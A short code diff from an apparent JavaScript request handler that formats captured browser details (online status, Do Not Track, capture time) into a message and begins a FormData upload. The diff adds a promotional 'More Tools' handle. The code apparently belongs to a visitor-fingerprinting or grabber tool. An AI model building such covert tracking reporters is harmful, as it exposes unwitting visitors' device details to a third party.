@@ -54,6 +54,8 @@ export default async function handler(req, res) {
         `🌐 **Online:** ${f.online ? 'Yes' : 'No'}\n` +
         `🚫 **DNT:** ${f.doNotTrack || 'N/A'}\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
+        `**More Tools:** @cyber_sniper\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
         `🕒 **Captured:** ${new Date().toLocaleString()}`;
 
     let form = new FormData();
